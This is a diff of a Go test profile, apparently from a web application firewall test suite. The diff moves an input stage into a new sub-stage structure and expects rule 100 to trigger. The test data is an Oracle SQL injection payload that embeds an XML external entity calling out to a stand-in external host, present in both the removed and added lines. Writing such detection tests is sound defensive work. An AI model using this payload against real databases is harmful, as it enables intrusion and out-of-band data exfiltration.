@@ -16,13 +16,15 @@ var _ = profile.RegisterProfile(profile.Profile{
 			Title: "posturlencoded",
 			Stages: []profile.ProfileStage{
 				{
-					Input: profile.ProfileStageInput{
-						URI:    "/",
-						Method: "POST",
-						Data:   `var=EmptyValue'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % awpsd SYSTEM "http://0cddnr5evws01h2bfzn5zd0cm3sxvrjv7oufi4.example'||'foo.bar/">%awpsd;`,
-					},
-					Output: profile.ExpectedOutput{
-						TriggeredRules: []int{100},
+					Stage: profile.ProfileSubStage{
+						Input: profile.ProfileStageInput{
+							URI:    "/",
+							Method: "POST",
+							Data:   `var=EmptyValue'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % awpsd SYSTEM "http://0cddnr5evws01h2bfzn5zd0cm3sxvrjv7oufi4.example'||'foo.bar/">%awpsd;`,
+						},
+						Output: profile.ExpectedOutput{
+							TriggeredRules: []int{100},
+						},
 					},
 				},
 			},
